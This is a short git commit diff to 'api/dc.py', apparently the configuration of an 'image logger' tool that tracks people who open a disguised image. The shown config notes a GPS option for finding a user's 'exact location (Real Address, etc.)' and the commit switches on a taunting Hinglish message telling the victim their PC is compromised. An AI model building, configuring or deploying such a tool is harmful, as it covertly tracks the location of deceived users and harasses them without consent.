425ba739fde5e9870b2bcf09cd0dfe7806fd50a2
Amanatk <82496446+Amanatk@users.noreply.github.com>
2025-02-02 20:27:35 +0530

    Update dc.py

--- api/dc.py
+++ api/dc.py
@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "JB IMAGE OPEN NAI HO RAHA THA TO UNGLI KYU KR RAHA THA AB HAG GAYA PC MOJ KR", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
